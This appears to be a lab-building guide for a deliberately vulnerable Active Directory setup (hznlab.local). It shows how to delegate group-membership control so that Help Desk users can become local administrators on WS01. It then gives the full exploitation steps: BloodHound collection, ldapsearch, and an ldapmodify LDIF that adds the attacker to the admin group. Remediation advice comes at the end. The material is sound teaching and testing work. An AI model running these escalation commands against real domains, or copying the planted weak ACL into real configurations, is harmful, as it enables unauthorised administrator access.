# Vulnerability 03 - Active Directory ACL Abuse

## Objective
Create a delegated group-management weakness that allows Help Desk membership to become local administrator access on WS01.

## Attack path

```text
JWILSON
   |
MemberOf
   v
GG_HELPDESK
   |
WriteProperty(member)
   v
GG_WORKSTATIONADMINS
   |
GPO
   v
WS01\Administrators
```

## Delegate group membership control

On DC01:

```powershell
$target = (Get-ADGroup GG_WorkstationAdmins).DistinguishedName
dsacls $target /G "HZNLAB\GG_HelpDesk:WP;member"
```

Verify:

```powershell
dsacls $target
```

## Make the target group local admin

In Group Policy Management, create and link:

```text
Workstation Local Administrators
```

to:

```text
OU=Workstations,OU=HZN Computers,DC=hznlab,DC=local
```

Edit:

```text
Computer Configuration
 -> Preferences
 -> Control Panel Settings
 -> Local Users and Groups
```

Create:

```text
Action: Update
Group: Administrators (built-in)
Member: HZNLAB\GG_WorkstationAdmins
```

On WS01:

```powershell
gpupdate /force
gpresult /r /scope computer
Get-LocalGroupMember Administrators
```

Confirm `HZNLAB\GG_WorkstationAdmins` is present.

## Baseline

```bash
nxc smb 10.10.10.21 \
  -u jwilson \
  -p 'HznLab2026!'
```

Authentication should work without `(Pwn3d!)`.

## BloodHound

```bash
bloodhound-python \
  -u jwilson \
  -p 'HznLab2026!' \
  -d hznlab.local \
  -ns 10.10.10.10 \
  -dc dc01.hznlab.local \
  -c All
```

Upload the JSON and inspect the relationship between `GG_HELPDESK` and `GG_WORKSTATIONADMINS`.

## Validate the ACL from Kali

Retrieve exact DNs:

```bash
ldapsearch -x \
  -H ldap://10.10.10.10 \
  -D 'jwilson@hznlab.local' \
  -w 'HznLab2026!' \
  -b 'DC=hznlab,DC=local' \
  '(sAMAccountName=GG_WorkstationAdmins)' distinguishedName

ldapsearch -x \
  -H ldap://10.10.10.10 \
  -D 'jwilson@hznlab.local' \
  -w 'HznLab2026!' \
  -b 'DC=hznlab,DC=local' \
  '(sAMAccountName=jwilson)' distinguishedName
```

Create `/tmp/add-jwilson.ldif` using the exact returned DNs:

```ldif
dn: CN=GG_WorkstationAdmins,OU=HZN Groups,DC=hznlab,DC=local
changetype: modify
add: member
member: CN=James Wilson,OU=IT,OU=HZN Users,DC=hznlab,DC=local
```

Apply:

```bash
ldapmodify -x \
  -H ldap://10.10.10.10 \
  -D 'jwilson@hznlab.local' \
  -w 'HznLab2026!' \
  -f /tmp/add-jwilson.ldif
```

Validate:

```bash
nxc smb 10.10.10.21 \
  -u jwilson \
  -p 'HznLab2026!'
```

Expected:

```text
(Pwn3d!)
```

## Reset exploited state

Keep the vulnerable ACL, but remove `jwilson` from the target group:

```powershell
Remove-ADGroupMember `
  -Identity "GG_WorkstationAdmins" `
  -Members "jwilson" `
  -Confirm:$false
```

## Remediation
Minimize delegated control over privileged groups, review ACLs on groups/OUs, and monitor sensitive group membership changes.
